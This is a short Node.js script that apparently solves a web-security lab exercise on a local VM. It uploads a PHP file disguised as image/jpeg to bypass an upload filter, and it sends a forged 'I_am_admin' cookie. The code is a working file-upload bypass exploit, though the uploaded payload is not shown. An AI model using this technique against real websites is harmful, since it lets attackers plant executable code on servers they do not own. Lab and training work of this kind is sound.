// @ts-check
import fetch from "node-fetch"
import formData from "form-data"
import fs from "fs/promises"

async function main() {
    try {
        const form = new formData()
        form.append('uploaded', await fs.readFile('./script.php'), {
            contentType: 'image/jpeg',
            filename: "script.php"
        });
        form.append('MAX_FILE_SIZE', 10_000);
        form.append('Upload', "Upload")

        const response = await fetch("http://192.168.56.101/?page=upload", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                ...form.getHeaders(),
                "upgrade-insecure-requests": "1",
                "cookie": "I_am_admin=68934a3e9455fa72420237eb05902327",
                "Referer": "http://192.168.56.101/?page=upload",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            // "body": "------WebKitFormBoundaryr9KaG8P230OzUHGs\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryr9KaG8P230OzUHGs\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"script.php\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryr9KaG8P230OzUHGs\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryr9KaG8P230OzUHGs--\r\n",
            "body": form,
            "method": "POST"
        });
        console.log(await response.text())
    } catch (e) {
        console.error(e)
    }
}

main()